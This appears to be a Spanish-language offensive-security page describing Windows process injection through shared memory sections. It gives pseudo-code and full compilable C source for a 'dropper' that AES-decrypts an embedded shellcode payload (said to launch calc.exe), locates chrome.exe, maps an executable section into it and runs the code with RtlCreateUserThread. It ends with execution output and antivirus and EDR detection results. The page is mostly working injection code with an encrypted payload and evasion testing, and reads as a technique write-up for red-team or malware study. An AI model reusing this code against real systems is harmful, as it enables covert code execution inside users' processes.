---
layout: default
---

# Inyección en proceso externo mediante memoria compartida

El tipo de inyección que se describe a continuación, se centra en explotar la capacidad del acceso a memoria compartida entre procesos, dentro del mismo sistema operativo con los privilegios adecuados.
Para poder compartir memoria es necesario crear una sección y acceder a dicha sección desde una vista, por lo tanto el flujo de la inyección quedaría del siguiente modo:
- El proceso malicioso, crea una nueva sección en memoria.
- EL proceso malicioso, crea vista en su espacio de memoria la cual le permitira mapera la sección y hacer uso de la misma.
- El proceos malicios, realiza una compia del shellcode en la sección creada mediante la vista que mapea dicha sección de memoria
- Tras la busqueda del proceso objetivo, se crea una vista remota a la sección de memoria que contiene el payload malicioso.
- El proceso malicioso ejecuta un hilo, en el proceso remoto invocando a la posición de memoria de la sección a traves de la vista remota creada.

Facil y sencillo "Shared Memory"

## Diagrama de flujo de la inyección

![Shared Memory injection](/assets/images/shared_memory_sections_views.png)

## Pseudo-codigo de la inyección

```c
// 1. Se crea una nueva sección en memoria del proceso local
NtCreateSection(&hSection, ..., &payload_len, PAGE_EXECUTE_READWRITE, ..., NULL)

// 2. Se crea una nueva vista para el acceso a la sección de memoria
NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, ..., &payload_len, ...)

// 3. se escribe el shellcode del proceso en la sección creada mediante la vista
memcpy(pLocalView, payload, payload_len)

// 4. Se crea una vista remota en el proceso externo
NtMapViewOfSection(hSection, RemoteProc, &pRemoteView, ..., &payload_len, ..., PAGE_EXECUTE_READ)

// 5. Se ejecuta el shellcode mediante un hilo desde el proceso externo mediante la vista remota
RtlCreateUserThread(RemoteProc, ..., pRemoteView, 0, &hThread, &cid)

```

## Código fuente

### Inyección en binario EXE

`Nota importante :` En la función injection, si se descomentan las funcionaes printf que escriben por pantalla las posiciones de memoría, sección, vistas, etc. ¡La inyección no funciona!, por lo tanto para el correcto funcionamiento de la inyección entre procesos, mantener comentadas las lineas.

```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
unsigned char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };


// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}



HANDLE FindThread(int pid){
	printf("[FindThread] for pid %d \n", pid);
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;
	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	while (Thread32Next(Snap, &thEntry)) {
		//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);
		if (thEntry.th32OwnerProcessID == pid) 	{
			printf("[FindThread] : Thread found %d :", thEntry.th32ThreadID);
			printf(" ProcessId %d \n", thEntry.th32OwnerProcessID);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido     
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				//printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("[FindProcess]: Process Found %s :", pe32.szExeFile);
						printf(" PID %d \n", pid);
                        break;
                }
        }       
        CloseHandle(hProcSnap); //se cierra el snapshot       
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	HANDLE lProc = GetCurrentProcess();
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	//printf("[Inject].NtCreateSection [NTDLL.DLL] create memory section with full access %p \n", pNtCreateSection);
	//printf("[Inject].NtCreateSection [NTDLL.DLL] create memory section with full access %s \n", &pNtCreateSection);
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;
	pNtMapViewOfSection(hSection, lProc, &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);
	//printf("[Inject].NtMapViewOfSection [NTDLL.DLL] create LocalView with With READ_WRITE privileges  %p \n", pNtMapViewOfSection);
	//printf("[Inject].NtMapViewOfSection [NTDLL.DLL] create LocalView with With READ_WRITE privileges  %s \n", &pNtMapViewOfSection);
	memcpy(pLocalView, payload, payload_len);
	//printf("[Inject].memcpy Copy shellcode %p \n", pLocalView);
	//printf("[Inject].memcpy Copy shellcode %s \n", &pLocalView);
	pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	//printf("[Inject].NtMapViewOfSection [NTDLL.DLL] create RemoteView View with With EXECUTE_READ privileges  %p \n", pNtMapViewOfSection);
	//printf("[Inject].NtMapViewOfSection [NTDLL.DLL] create RemoteView with With EXECUTE_READ privileges  %s \n", &pNtMapViewOfSection);
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	printf("[Inject].RtlCreateUserThread [NTDLL.DLL]  \n\t RemoteProcess %d \n\t RemoteThread %d \n\t RemoteView %p  \n\t LocalView %p  \n", hProc, hThread, pRemoteView,  pLocalView);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


int main(void) {   
	printf("[Main] Init Dropper \n");
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("chrome.exe");
	if (pid) {
		printf("[Main] chrome.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
			printf("[Main].AESDecrypt decrypt payload \n");
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	printf("[Main] End Dropper \n");
	return 0;
}


```

Salida de la ejecución:


```
shared_memory_injection.exe
[Main] Init Dropper
[FindProcess]: Process Found chrome.exe : PID 7688
[Main] chrome.exe PID = 7688
[Main].AESDecrypt decrypt payload
[Inject].RtlCreateUserThread [NTDLL.DLL]
         RemoteProcess 144
         RemoteThread 224
         RemoteView 0000018EEFFC0000
         LocalView 000001DA325A0000
[Main] End Dropper
```

Evidencia de la inyección para el shellcode:

![Thread Context Dll detections](/assets/images/shared_memory_sections_views_2.png)


## Detecciones 

El código tiene bastantes detecciones dado que interacciona con la librería NTDLL.dll en numerosas ocasiones durante su ejecución:
- NtCreateSection
- NtMapViewOfSection x2
- RtlCreateUserThread

| Code Type  | Windows Defender Bypass | AV Bypass | EDR Bypass |
| ------------- | ------------- | ------------- | ------------- |
| EXE inyeccion en el proceso externo mediante sección y vistas de memoria  | False | 15/72 VT detections | False |

![Thread Context Dcll detections](/assets/images/shared_memory_detection.png)

[back](./injection_types.html)